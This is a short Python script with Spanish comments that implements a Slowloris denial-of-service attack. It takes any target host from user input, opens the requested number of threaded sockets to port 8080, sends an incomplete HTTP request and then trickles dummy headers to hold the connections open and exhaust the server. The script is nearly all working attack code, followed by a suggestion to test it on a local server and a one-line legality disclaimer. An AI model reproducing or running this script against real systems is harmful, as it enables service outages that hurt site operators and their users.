import socket
import time
import threading


target_host = input("Ingrese el host objetivo (ej: localhost, 192.168.1.10, example.com): ")
target_port = 8080  

num_sockets = input("Ingrese el número de sockets a utilizar: ")  # Para una prueba visible, ingrese un número mayor a 1000
try:
    num_sockets = int(num_sockets)
except ValueError:
    print("Por favor, ingrese un número válido.")
    exit()

def slowloris_attack():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target_host, target_port))
        
        # Encabezado Host dinámico según el host proporcionado
        host_header = f"GET / HTTP/1.1\r\nHost: {target_host}\r\n"
        s.send(host_header.encode())

        while True:
            time.sleep(5)
            s.send(b"X-a: b\r\n")  # Mantiene viva la conexión sin terminarla
    except:
        pass

for _ in range(num_sockets):
    t = threading.Thread(target=slowloris_attack)
    t.start()
# sistema de pruebas:
# Para probar este script, puedes ejecutar un servidor HTTP simple en tu máquina local:
# Ejecuta el comando: python3 -m http.server 8080
# Luego, abre tu navegador y visita http://localhost:8080/
# Recuerda que el uso de DDoS puede ser ilegal y no se recomienda su uso malicioso. :3